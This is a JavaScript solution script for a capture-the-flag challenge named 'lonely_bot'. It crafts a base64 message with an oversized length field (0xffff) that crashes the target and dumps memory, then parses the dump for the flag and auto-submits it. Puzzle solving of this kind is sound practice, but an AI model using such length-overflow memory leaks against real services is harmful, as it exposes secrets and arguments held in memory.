/*
strings lonely_bot

...
I will decode valid base64 and treat it as the following C struct
#define MAX_LEN 50
struct MESSAGE {
    unsigned short type;
    unsigned short message_len;
    char message[];
--help
--flag
...

inputing base64 with
type = 0x45 ( 69 🤔 )
message_len = 0xffff
will seq fault but also print a hex dump of program memory which contains the command line arguments
*/

(function( challenge_id = "lonely_bot" ){

	runSolution( { challenge_id, solution } );

	async function solution( tag ){
		let b64 = btoa( "\x45\0\xff\xff" ),
		    res = await HackerChallenge.submitAnswer( "lonely_bot", [ b64, "" ] ).catch( data => data.responseJSON ),
		    mem = String.fromCharCode( ...res.hc_challenge.response.match( /[\da-f]{2}/gi ).map( x => parseInt( x, 16 ) ) ),
		    flag = mem.match( /--flag\0([^\0]+)/ )[1];
		console.info( b64 );
		console.info( flag );
		tag.refs.answer.value = b64;
		tag.refs.flag.value = flag;
		tag.submitAnswer();
	}
})();
